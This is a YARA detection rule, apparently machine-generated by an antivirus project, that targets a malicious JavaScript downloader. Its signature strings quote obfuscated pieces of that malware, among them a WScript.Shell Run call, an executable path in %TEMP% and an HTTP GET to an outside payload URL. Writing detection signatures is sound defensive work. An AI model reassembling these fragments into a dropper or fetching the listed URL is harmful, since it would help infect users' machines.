rule sig_20160329_771a26bca85731b1b9381f55fdf99e95 {
  meta:
    description = "datamaliciousorder - file 20160329_771a26bca85731b1b9381f55fdf99e95.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "80174a7140e1d56a2e377c9ce0fa128ccdb7b45cdb9c91cb7eb156fccb9caba1"

  strings:
    $s1  = "function Ckuvz() {return Nhmrljwr[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"AnE13x2wm.exe\";};" fullword ascii
    $s2  = "Rvkqus[Ldmkvf](\"GET\", \"http://santhiyasreetrading.com/j5ysdla\", false);" fullword ascii
    $s3  = "do {WScript[Zcwitbri](Yqxhcpejfo() * 11)} while (Rvkqus[\"readystate\"] < 2 * 2);" fullword ascii
    $s4  = "var Nhmrljwr = function Xlvfwtzv() {return WScript[Jnfgzgoqq](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Upyfahyjh(Wsnmcyww, Kkmuhdnvml){return Wsnmcyww - Kkmuhdnvml;};" fullword ascii
    $s6  = "function Gzukbvvl() {return ((Ahisrr == true) && (Ahisrr == Zojlaaki)) ? 1 : Ljikdzkl;};" fullword ascii
    $s7  = "function Xeqeoerveg(Rpjrqxl){Nhmrljwr[\"Run\"](Rpjrqxl, Ljikdzkl, Ljikdzkl);};" fullword ascii
    $s8  = "var Ahisrr = false;" fullword ascii
    $s9  = "function Yqxhcpejfo(){return 22;};" fullword ascii
    $s10 = " while (Tipkxydlji){" fullword ascii
    $s11 = "function Tqarlxyy()" fullword ascii
    $s12 = "function Wjohh(Iqkml) {var Gnabomdno = (1, 2, 3, 4, 5, Iqkml); return Gnabomdno;};" fullword ascii
    $s13 = "function Dpidfhlkty(){return Rwlokun;};" fullword ascii
    $s14 = "var Zojlaaki = false;" fullword ascii
    $s15 = "function Lwxcjmcpcs(){return Jnfgzgoqq;};" fullword ascii
    $s16 = "return Upyfahyjh(Tffedulcx, Lamkrvi);" fullword ascii
    $s17 = "Zojlaaki = true; " fullword ascii
    $s18 = "Ahisrr = true; " fullword ascii
    $s19 = "var Zvquucqlxj = new this[\"Date\"]();" fullword ascii
    $s20 = "var Dbwqsomz = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}